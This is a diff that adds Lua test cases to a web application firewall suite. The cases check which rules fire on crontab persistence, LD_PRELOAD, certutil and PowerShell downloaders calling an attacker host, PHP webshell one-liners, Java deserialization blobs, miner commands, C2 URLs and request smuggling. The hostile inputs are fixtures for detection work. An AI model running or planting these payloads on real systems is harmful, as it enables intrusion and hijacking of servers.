@@ -466,6 +466,682 @@ do
   check(hit == false, "27: webshell_ping — non-empty UA, no hit")
 end
 
+-- ── Test 28: R2 persistence — crontab append in args (rule 323) ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_persistence", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    args = "cmd=(crontab%20-l;%20echo%20miner)",
+  }))
+  check(hit == true,                                            "28: persistence — hit")
+  check(reason and reason:find("PERSISTENCE:CRONTAB_APPEND", 1, true),
+                                                                "28: persistence — tag")
+  check(action == "logonly",                                    "28: persistence — logonly")
+  check(rule_id == 323,                                         "28: persistence — rule id 323")
+end
+
+-- ── Test 29: R2 persistence — bare crontab mention doesn't fire ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_persistence", "logonly")
+
+  -- "crontab -l" alone is too benign to flag (admin tools list cron).
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "Run 'crontab -l' to list cron entries.",
+  }))
+  check(hit == false, "29: persistence — bare crontab -l prose, no hit")
+end
+
+-- ── Test 30: R3 rootkit_artifacts — LD_PRELOAD path in body (rule 324) ───────
+do
+  disable_all_rules()
+  waf.set_rule("rule_rootkit_artifacts", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "evil=LD_PRELOAD=/tmp/x.so /usr/bin/id",
+  }))
+  check(hit == true,                                          "30: rootkit — hit")
+  check(reason and reason:find("ROOTKIT:LD_PRELOAD_PATH", 1, true),
+                                                              "30: rootkit — tag")
+  check(action == "logonly",                                  "30: rootkit — logonly")
+  check(rule_id == 324,                                       "30: rootkit — rule id 324")
+end
+
+-- ── Test 31: R3 rootkit_artifacts — bare LD_PRELOAD mention doesn't fire ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_rootkit_artifacts", "logonly")
+
+  -- "LD_PRELOAD" without the =/ assignment shape is benign prose.
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "The LD_PRELOAD environment variable lets you preload a shared library.",
+  }))
+  check(hit == false, "31: rootkit — bare LD_PRELOAD prose, no hit")
+end
+
+-- ── Test 32: R4 lolbin — certutil downloader (rule 325) ──────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_lolbin", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "cmd=certutil -urlcache -split -f http://attacker/x.exe",
+  }))
+  check(hit == true,                                          "32: lolbin — hit")
+  check(reason and reason:find("LOLBIN:CERTUTIL_URLCACHE", 1, true),
+                                                              "32: lolbin — tag")
+  check(action == "logonly",                                  "32: lolbin — logonly")
+  check(rule_id == 325,                                       "32: lolbin — rule id 325")
+end
+
+-- ── Test 33: R4 lolbin — IEX-WebClient is R1's territory, not R4's ───────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_lolbin",        "logonly")
+  waf.set_rule("rule_reverse_shell", "logonly")
+
+  -- Pattern that's intentionally only in R1's table (not R4's). Asserts R4
+  -- doesn't double-count it; the hit should come from rule 322, not 325.
+  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "cmd=iex(new-object net.webclient).downloadstring('http://x')",
+  }))
+  check(hit == true,    "33: lolbin/r1 — IEX-WebClient hit")
+  check(rule_id == 322, "33: lolbin/r1 — credited to R1 (322), not R4 (325)")
+end
+
+-- ── Test 34: C2 java_deserialize — base64 prefix in body (rule 326) ──────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "payload=rO0ABXNyABxqYXZhLnV0aWwuQXJyYXlMaXN0",
+  }))
+  check(hit == true,                                                "34: java_deserialize — hit")
+  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",            "34: java_deserialize — reason")
+  check(action == "logonly",                                        "34: java_deserialize — logonly")
+  check(rule_id == 326,                                             "34: java_deserialize — rule id 326")
+end
+
+-- ── Test 35: C2 java_deserialize — raw magic bytes in body ──────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+
+  -- Construct a body with the raw 4-byte STREAM_MAGIC + STREAM_VERSION.
+  local body = "garbagepre\xac\xed\x00\x05garbagepost"
+  local hit, reason = waf.check(fresh_ctx({
+    method = "POST",
+    body   = body,
+  }))
+  check(hit == true,                                       "35: java_deserialize — raw magic hit")
+  check(reason == "WAF_RCE:JAVA_DESERIALIZE:RAW_MAGIC",    "35: java_deserialize — RAW_MAGIC tag")
+end
+
+-- ── Test 36: C2 java_deserialize — hex form in args ──────────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({
+    args = "blob=aced00057372001c6a6176",
+  }))
+  check(hit == true,                                       "36: java_deserialize — hex hit")
+  check(reason == "WAF_RCE:JAVA_DESERIALIZE:HEX_PREFIX",   "36: java_deserialize — HEX_PREFIX tag")
+end
+
+-- ── Test 37: C2 java_deserialize — Cookie header carries the gadget ──────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+
+  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    headers = { ["Cookie"] = "JSESSIONID=rO0ABXNyABF" },
+  }))
+  check(hit == true,                                               "37: java_deserialize — cookie hit")
+  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",           "37: java_deserialize — cookie reason")
+  check(rule_id == 326,                                            "37: java_deserialize — cookie rule id")
+end
+
+-- ── Test 38: C2 java_deserialize — benign base64 doesn't fire ────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+
+  -- "Hello world" base64 = "SGVsbG8gd29ybGQ=" — has no rO0AB prefix and
+  -- no aced0005 substring. Verifies the detector doesn't fire on random b64.
+  local hit = waf.check(fresh_ctx({
+    args = "data=SGVsbG8gd29ybGQ=",
+  }))
+  check(hit == false, "38: java_deserialize — benign base64, no hit")
+end
+
+-- ── Test 39: C2 java_deserialize — does NOT shadow PHP serialize (rule 306) ──
+do
+  disable_all_rules()
+  waf.set_rule("rule_java_deserialize", "logonly")
+  waf.set_rule("rule_serialize",        "logonly")
+
+  -- PHP serialized object — should fire 306 only, not 326.
+  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    args = 'data=O:8:"stdClass":1:{s:1:"x";i:1;}',
+  }))
+  check(hit == true,    "39: java/php disjoint — PHP serialize fires")
+  check(rule_id == 306, "39: java/php disjoint — credited to PHP (306), not Java (326)")
+end
+
+-- ── Test 40: W2 ext — webshell-name b374k + <?php scores past threshold ──────
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- b374k (+3) + <?php (+2) = 5 → exactly at min_score, fires.
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "src=<?php /* b374k loader */",
+  }))
+  check(hit == true,                            "40: W2 ext — hit")
+  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_B374K", "40: W2 ext — RAW_WS_B374K tag")
+  check(action == "challenge",                  "40: W2 ext — challenge")
+  check(rule_id == 404,                         "40: W2 ext — rule id 404 (extension, not new rule)")
+end
+
+-- ── Test 41: W2 ext — bare webshell-name in prose without <?php doesn't fire ─
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- Just "b374k" alone (+3) is below min_score (5). The early-out lets us
+  -- reach scoring (b374k is a trigger), but score stays under threshold.
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "text/plain" },
+    body    = "Article comment: I read about the b374k shell yesterday.",
+  }))
+  check(hit == false, "41: W2 ext — bare prose mention doesn't trigger")
+end
+
+-- ── Test 42: W2 ext — c99shell name takes precedence over generic eval tag ──
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- c99shell (+3) + <?php (+2) + eval( (+3) = 8. Both ws_tag and the
+  -- callable would emit a tag; ws_tag wins per the design.
+  local _hit, reason = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "code=<?php c99shell; eval($_POST['x']);",
+  }))
+  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_C99SHELL",
+        "42: W2 ext — webshell-name tag outranks RAW_EVAL_POST")
+end
+
+-- ── Test 43: W3 ext — hex2bin contributes to obfuscation score (rule 405) ───
+do
+  disable_all_rules()
+  waf.set_rule("rule_script_obfuscation", "challenge")
+
+  -- hex2bin (+2) + base64_decode (+2) + eval (+3) = 7 → past min_score (6).
+  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "x=eval(hex2bin(base64_decode($_POST['p'])))",
+  }))
+  check(hit == true,                                         "43: W3 ext — hit")
+  check(reason and reason:find("HEX2BIN", 1, true),          "43: W3 ext — HEX2BIN in tags")
+  check(rule_id == 405,                                      "43: W3 ext — rule id 405")
+end
+
+-- ── Test 44: B2 ext — TRACE method emits sub-tag in reason ──────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_exploit_methods", "block")
+
+  local hit, reason, _ttl, action = waf.check(fresh_ctx({ method = "TRACE" }))
+  check(hit == true,                              "44: B2 ext — TRACE hit")
+  check(reason == "WAF_EXPLOIT_METHOD:TRACE",     "44: B2 ext — sub-tag emitted")
+  check(action == "block",                        "44: B2 ext — block action preserved")
+end
+
+-- ── Test 45: B2 ext — PROPFIND emits DAV_PROPFIND sub-tag ───────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_exploit_methods", "challenge")
+
+  local _hit, reason = waf.check(fresh_ctx({ method = "PROPFIND" }))
+  check(reason == "WAF_EXPLOIT_METHOD:DAV_PROPFIND",
+        "45: B2 ext — DAV_PROPFIND sub-tag")
+end
+
+-- ── Test 46: X2-stratum ext — stratum+tcp:// fires rule 701 ─────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_ssrf", "logonly")
+
+  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    args = "url=stratum+tcp://pool.minexmr.com:4444",
+  }))
+  check(hit == true,                          "46: X2-stratum — hit")
+  check(reason == "WAF_SSRF:SSRF_STRATUM",    "46: X2-stratum — reason")
+  check(rule_id == 701,                       "46: X2-stratum — rule id 701 (folded, not new)")
+end
+
+-- ── Test 47: X1 c2_tunnel — pastebin raw URL in body (rule 702) ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_c2_tunnel", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "fetch=https://pastebin.com/raw/AbCdEf12",
+  }))
+  check(hit == true,                          "47: X1 c2_tunnel — hit")
+  check(reason == "WAF_C2:TUNNEL:PASTEBIN_RAW", "47: X1 c2_tunnel — reason")
+  check(action == "logonly",                  "47: X1 c2_tunnel — logonly")
+  check(rule_id == 702,                       "47: X1 c2_tunnel — rule id 702")
+end
+
+-- ── Test 48: X1 c2_tunnel — Discord CDN attachment URL ──────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_c2_tunnel", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({
+    args = "url=https://cdn.discordapp.com/attachments/123/456/payload.exe",
+  }))
+  check(hit == true,                                       "48: X1 c2_tunnel — discord hit")
+  check(reason == "WAF_C2:TUNNEL:DISCORD_CDN",             "48: X1 c2_tunnel — discord tag")
+end
+
+-- ── Test 49: X1 c2_tunnel — bare pastebin.com without /raw/ doesn't fire ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_c2_tunnel", "logonly")
+
+  -- Pastebin homepage URLs don't have /raw/ — those are usually shared by
+  -- humans, not used for C2.
+  local hit = waf.check(fresh_ctx({
+    args = "ref=https://pastebin.com/AbCdEf12",
+  }))
+  check(hit == false, "49: X1 c2_tunnel — bare pastebin.com without /raw/, no hit")
+end
+
+-- ── Test 50: X2 coinminer — xmrig invocation flag (rule 327) ────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_coinminer", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "cmd=xmrig --url stratum+tcp://pool.example:4444 -u WALLET",
+  }))
+  check(hit == true,                                          "50: X2 coinminer — hit")
+  check(reason and reason:find("COINMINER:XMRIG_URL", 1, true), "50: X2 coinminer — XMRIG_URL tag")
+  check(action == "logonly",                                  "50: X2 coinminer — logonly")
+  check(rule_id == 327,                                       "50: X2 coinminer — rule id 327")
+end
+
+-- ── Test 51: X2 coinminer — public pool hostname only ───────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_coinminer", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({
+    body = "config=pool.minexmr.com:5555",
+  }))
+  check(hit == true,                                                "51: X2 coinminer — pool hit")
+  check(reason and reason:find("COINMINER:POOL_MINEXMR", 1, true),  "51: X2 coinminer — POOL_MINEXMR tag")
+end
+
+-- ── Test 52: B1 smuggling_cl — both Content-Length and Transfer-Encoding ────
+do
+  disable_all_rules()
+  waf.set_rule("rule_smuggling_cl", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = {
+      ["Content-Length"]    = "10",
+      ["Transfer-Encoding"] = "chunked",
+    },
+    body = "abcdef",
+  }))
+  check(hit == true,                              "52: B1 smuggling_cl — hit")
+  check(reason == "WAF_HTTP_SMUGGLING:CL_AND_TE", "52: B1 smuggling_cl — CL_AND_TE tag")
+  check(action == "logonly",                      "52: B1 smuggling_cl — logonly")
+  check(rule_id == 608,                           "52: B1 smuggling_cl — rule id 608")
+end
+
+-- ── Test 53: B1 smuggling_cl — multi-CL (joined by nginx) ───────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_smuggling_cl", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Length"] = "5, 10" },
+    body    = "abc",
+  }))
+  check(hit == true,                              "53: B1 smuggling_cl — multi-CL hit")
+  check(reason == "WAF_HTTP_SMUGGLING:MULTI_CL",  "53: B1 smuggling_cl — MULTI_CL tag")
+end
+
+-- ── Test 54: B1 smuggling_cl — well-formed CL alone doesn't fire ────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_smuggling_cl", "logonly")
+
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Length"] = "12" },
+    body    = "Hello world!",
+  }))
+  check(hit == false, "54: B1 smuggling_cl — well-formed CL, no hit")
+end
+
+-- ── Test 55: B3 long_path_segment — segment ≥ 256 chars (rule 102) ──────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_long_path_segment", "logonly")
+
+  -- 300-char segment, well over the 256 threshold.
+  local big = string.rep("A", 300)
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    uri = "/api/" .. big,
+  }))
+  check(hit == true,                                  "55: B3 long_path_segment — hit")
+  check(reason == "WAF_LONG_PATH:SEG_300",            "55: B3 long_path_segment — SEG_300 tag")
+  check(action == "logonly",                          "55: B3 long_path_segment — logonly")
+  check(rule_id == 102,                               "55: B3 long_path_segment — rule id 102")
+end
+
+-- ── Test 56: B3 long_path_segment — short URI doesn't fire ──────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_long_path_segment", "logonly")
+
+  local hit = waf.check(fresh_ctx({
+    uri = "/some/normal/path/with/many/segments/index.html",
+  }))
+  check(hit == false, "56: B3 long_path_segment — normal URI, no hit")
+end
+
+-- ── Test 57: B4 header_flood — > 16 KB of non-session headers (rule 609) ────
+do
+  disable_all_rules()
+  waf.set_rule("rule_header_flood", "logonly")
+
+  -- Build a non-session header > 16 KB. X-Custom: <17000 chars>
+  local big = string.rep("X", 17000)
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    headers = { ["X-Custom-Junk"] = big },
+  }))
+  check(hit == true,                                "57: B4 header_flood — hit")
+  check(reason and reason:find("WAF_HEADER_FLOOD:FLOOD:", 1, true),
+                                                    "57: B4 header_flood — FLOOD tag")
+  check(action == "logonly",                        "57: B4 header_flood — logonly")
+  check(rule_id == 609,                             "57: B4 header_flood — rule id 609")
+end
+
+-- ── Test 58: B4 header_flood — large Cookie alone doesn't fire ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_header_flood", "logonly")
+
+  -- 17 KB Cookie — legit on shared hosting with WP/cPanel session bloat.
+  local big = string.rep("c", 17000)
+  local hit = waf.check(fresh_ctx({
+    headers = { ["Cookie"] = big },
+  }))
+  check(hit == false, "58: B4 header_flood — Cookie alone is session state, no hit")
+end
+
+-- Helper to build a multipart body with a single part of the given headers
+-- and payload. Boundary is a fixed test sentinel; the same string is fed
+-- into the request Content-Type header.
+local TEST_BOUNDARY = "----CFMTestBoundary12345"
+local function multipart_body(part_headers, payload)
+  return "--" .. TEST_BOUNDARY .. "\r\n"
+      .. part_headers .. "\r\n\r\n"
+      .. payload .. "\r\n"
+      .. "--" .. TEST_BOUNDARY .. "--\r\n"
+end
+local TEST_CT = "multipart/form-data; boundary=" .. TEST_BOUNDARY
+
+-- ── Test 59: W4 polyglot — image/png CT + <?php opener (rule 412) ───────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_polyglot_upload", "logonly")
+
+  local body = multipart_body(
+    'Content-Disposition: form-data; name="avatar"; filename="x.png"\r\n'
+    .. 'Content-Type: image/png',
+    "<?php @eval($_POST['c']); ?>")
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = TEST_CT },
+    body    = body,
+  }))
+  check(hit == true,                                       "59: W4 polyglot — hit")
+  check(reason == "WAF_UPLOAD_CONTENT:POLYGLOT_PHP",       "59: W4 polyglot — POLYGLOT_PHP tag")
+  check(action == "logonly",                               "59: W4 polyglot — logonly")
+  check(rule_id == 412,                                    "59: W4 polyglot — rule id 412")
+end
+
+-- ── Test 60: W4 polyglot — .jpg filename without image CT still fires ───────
+do
+  disable_all_rules()
+  waf.set_rule("rule_polyglot_upload", "logonly")
+
+  -- No Content-Type on the part — but the filename ends in .jpg, which is
+  -- enough to trigger the image-claimed branch.
+  local body = multipart_body(
+    'Content-Disposition: form-data; name="up"; filename="cute.jpg"',
+    "<%@ page import=\"java.util.*\" %>")
+  local hit, reason = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = TEST_CT },
+    body    = body,
+  }))
+  check(hit == true,                                                    "60: W4 polyglot — jsp directive hit")
+  check(reason == "WAF_UPLOAD_CONTENT:POLYGLOT_JSP_DIRECTIVE",          "60: W4 polyglot — JSP directive tag")
+end
+
+-- ── Test 61: W4 polyglot — image part without executable opener doesn't fire ─
+do
+  disable_all_rules()
+  waf.set_rule("rule_polyglot_upload", "logonly")
+
+  -- A real PNG starts with the PNG signature bytes — no <?php / <% / <jsp:.
+  local body = multipart_body(
+    'Content-Disposition: form-data; name="avatar"; filename="x.png"\r\n'
+    .. 'Content-Type: image/png',
+    "\x89PNG\r\n\x1a\n....IHDR....actually-an-image")
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = TEST_CT },
+    body    = body,
+  }))
+  check(hit == false, "61: W4 polyglot — real PNG bytes, no hit")
+end
+
+-- ── Test 62: W4 polyglot — text form field with <?php text doesn't fire ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_polyglot_upload", "logonly")
+
+  -- A regular text form field (no image CT, no image extension) carrying
+  -- <?php text. Rule 402 would scan the raw body and fire; W4 does NOT
+  -- because the part isn't image-claimed.
+  local body = multipart_body(
+    'Content-Disposition: form-data; name="snippet"',
+    "<?php echo 'pasted code sample for the article'; ?>")
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = TEST_CT },
+    body    = body,
+  }))
+  check(hit == false, "62: W4 polyglot — non-image text field with <?php text, no hit")
+end
+
+-- ── Test 63: Rule 404 ext — <?php + $_POST + dynamic include fires (404) ───
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- Loader-pattern fingerprint shared by samples 1+4 (forms.php / user.php)
+  -- from the 2026-05-09 sample-replay audit: include's argument is a
+  -- variable that came from $_POST. Score: <?php(+2) + $_POST(+2) +
+  -- dyn-include(+1) = 5 → fires.
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "src=<?php $tmp=$_POST['key']; include $tmp;",
+  }))
+  check(hit == true,                                          "63: rule 404 ext — hit")
+  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_DYN_INCLUDE",    "63: rule 404 ext — RAW_DYN_INCLUDE tag")
+  check(action == "challenge",                                "63: rule 404 ext — challenge action")
+  check(rule_id == 404,                                       "63: rule 404 ext — rule id 404 (extension, not new rule)")
+end
+
+-- ── Test 64: Rule 404 ext — sanitised forms.php loader (variable include) ──
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- Faithful sanitised excerpt from the 5a71c4ab-forms.php sample:
+  -- include_once $_13 (variable form). Score: <?php(+2) + $_POST(+2) +
+  -- dyn-include_once(+1) = 5 → fires.
+  local body = '<?php if(@$_POST["key"]!==null): '
+            .. '$_13="/tmp/.pset"; '
+            .. '$f=fopen($_13,"w"); fwrite($f,$payload); fclose($f); '
+            .. 'include_once $_13; unlink($_13); '
+            .. 'endif;'
+  local hit, reason = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = body,
+  }))
+  check(hit == true,                                                 "64: rule 404 ext — forms.php sample hit")
+  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_DYN_INCLUDE_ONCE",      "64: rule 404 ext — RAW_DYN_INCLUDE_ONCE tag")
+end
+
+-- ── Test 65: Rule 404 ext — bare WP bootstrap (literal include, no SG) ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- WordPress-style bootstrap: literal include __DIR__... — has_dynamic_include
+  -- skips this (next char after `include\s+` is `_`, not `$`). Score: 2+0=2.
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = '<?php include __DIR__."/wp-blog-header.php";',
+  }))
+  check(hit == false, "65: rule 404 ext — WP bootstrap (literal include), no hit")
+end
+
+-- ── Test 66: Rule 404 ext — legit echo with $_POST does NOT fire (FP fix) ──
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- Pre-fix this body scored 5 (<?php + $_POST + ;<?php bonus) and FP'd
+  -- with tag RAW_SUPERGLOBAL — the bonus has been removed. New score:
+  -- <?php(+2) + $_POST(+2) = 4 < 5 → no hit. This is the targeted FP fix.
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "<?php $x=$_POST['msg']; echo htmlspecialchars($x);",
+  }))
+  check(hit == false, "66: rule 404 ext — legit echo with $_POST, no FP")
+end
+
+-- ── Test 67: Rule 404 ext — legit code-snippet save with literal require ──
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- Code-snippet plugin save: require_once with literal-string path,
+  -- alongside a $_POST capture. Pre-fix this scored 5 and FP'd. Now:
+  -- has_dynamic_include skips the literal-string require_once, so
+  -- score = <?php(+2) + $_POST(+2) = 4 → no hit.
+  local hit = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "<?php require_once 'config.php'; $key=$_POST['k']; save($key);",
+  }))
+  check(hit == false, "67: rule 404 ext — legit literal-require + $_POST, no FP")
+end
+
+-- ── Test for regression: rule 402 upload_content path doesn't crash ────────
+-- Pre-fix: cfm_waf.lua:679 called is_known_legit_php_upload_endpoint as a
+-- bare global (the helper is exported on the util module but no local
+-- binding existed in cfm_waf.lua). Any multipart POST that triggered the
+-- rule_upload_content branch would crash _M.check with
+--   "attempt to call global 'is_known_legit_php_upload_endpoint' (a nil value)"
+-- Default mode is `block`, so this fired in production on every multipart
+-- upload — but no test exercised the path because of the crash.
+do
+  disable_all_rules()
+  waf.set_rule("rule_upload_content", "block")
+
+  -- Multipart body with a PHP-tag opener — would fire rule 402.
+  local body = "--b\r\n"
+            .. 'Content-Disposition: form-data; name="f"; filename="x.php"\r\n'
+            .. "\r\n"
+            .. "<?php eval($_POST['c']);\r\n"
+            .. "--b--\r\n"
+
+  -- Non-legit URI: rule should fire.
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    uri     = "/uploads/x.php",
+    headers = { ["Content-Type"] = "multipart/form-data; boundary=b" },
+    body    = body,
+  }))
+  check(hit == true,                                              "regression: rule 402 fires on multipart PHP upload")
+  check(reason and reason:find("WAF_UPLOAD_CONTENT", 1, true),    "regression: WAF_UPLOAD_CONTENT family")
+  check(action == "block",                                        "regression: block action")
+  check(rule_id == 402,                                           "regression: rule id 402")
+
+  -- Legit URI (Code Snippets plugin REST endpoint) should be skipped by
+  -- is_known_legit_php_upload_endpoint, so the rule does NOT fire.
+  local hit2 = waf.check(fresh_ctx({
+    method  = "POST",
+    uri     = "/wp-json/code-snippets/import",
+    headers = { ["Content-Type"] = "multipart/form-data; boundary=b" },
+    body    = body,
+  }))
+  check(hit2 == false, "regression: rule 402 skipped on Code Snippets endpoint (legit upload bypass)")
+end
+
+-- ── Test 68: Rule 404 ext — eval-family still fires (no regression) ────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_php_webshell_body", "challenge")
+
+  -- The original eval-detection path was the rule's main purpose. Removing
+  -- the ;<?php bonus mustn't weaken it. Score: <?php(+2) + $_POST(+2) +
+  -- eval((+3) = 7 → fires with RAW_EVAL_POST (the specific lookbehind).
+  local hit, reason = waf.check(fresh_ctx({
+    method  = "POST",
+    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
+    body    = "<?php @eval($_POST['c']);",
+  }))
+  check(hit == true,                                              "68: rule 404 ext — eval+$_POST still fires")
+  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_EVAL_POST",          "68: rule 404 ext — RAW_EVAL_POST tag preserved")
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
